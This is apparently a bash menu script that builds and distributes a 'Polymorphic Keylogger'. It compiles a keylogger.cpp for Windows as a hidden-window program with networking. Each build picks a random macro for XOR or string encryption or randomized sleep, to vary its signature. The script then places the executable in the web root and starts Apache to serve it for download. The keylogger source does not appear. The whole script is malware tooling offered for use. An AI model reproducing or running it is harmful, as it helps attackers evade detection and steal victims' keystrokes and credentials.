#!/bin/bash

# Function to display the banner
display_banner() {
    echo -e "\e[92m#################################################\e[0m"
    echo -e "\e[92m#                                               #\e[0m"
    echo -e "\e[92m#               \e[91mPolymorphic Keylogger\e[92m           #\e[0m"
    echo -e "\e[92m#                                               #\e[0m"
    echo -e "\e[92m#################################################\e[0m"
}

# Default values
LHOST="127.0.0.1"
LPORT="9999"

# Show options
show_options() {
    echo -e "\e[93mDefault Options:\e[0m"
    echo "LHOST: $LHOST"
    echo "LPORT: $LPORT"
    echo -e "\e[93mTo set LHOST, type: set LHOST=<IP_ADDRESS>\e[0m"
    echo -e "\e[93mTo set LPORT, type: set LPORT=<PORT_NUMBER>\e[0m"
    echo -e "\e[93mTo generate keylogger, type: generate\e[0m"
}

# Compile and generate the keylogger
generate_keylogger() {
    echo "Compiling the Polymorphic Keylogger..."

    # Randomly define macros to change code behavior
    MACRO_OPTS=("-DRANDOMIZE_SLEEP" "-DREVERSE_STRING_ENCRYPTION" "-DXOR_ENCRYPTION")
    RANDOM_MACRO=${MACRO_OPTS[$RANDOM % ${#MACRO_OPTS[@]}]}

    x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o keylogger.exe \
      -lws2_32 -mwindows $RANDOM_MACRO

    echo "Keylogger compiled with option: $RANDOM_MACRO"

    # Move the executable
    echo "Moving the keylogger executable to the server directory..."
    sudo mv keylogger.exe /var/www/html/keylogger.exe

    echo "Starting the server..."
    sudo systemctl start apache2

    echo "The keylogger is now available at: http://$LHOST/keylogger.exe"
}

# Start the server to serve the keylogger
start_server() {
    echo "Running the server to serve the keylogger..."
    sudo systemctl restart apache2
    echo "Server is running at http://$LHOST/keylogger.exe"
}

# Main loop
display_banner
while true; do
    echo -e "\e[92m1. Show options\e[0m"
    echo -e "\e[92m2. Generate and deploy keylogger\e[0m"
    echo -e "\e[92m3. Start server\e[0m"
    echo -e "\e[92m4. Exit\e[0m"
    echo -e "\e[93mSelect an option:\e[0m"
    read OPTION

    case $OPTION in
        1)
            show_options
            ;;
        2)
            generate_keylogger
            ;;
        3)
            start_server
            ;;
        4)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid option. Please select 1, 2, 3, or 4."
            ;;
    esac
done
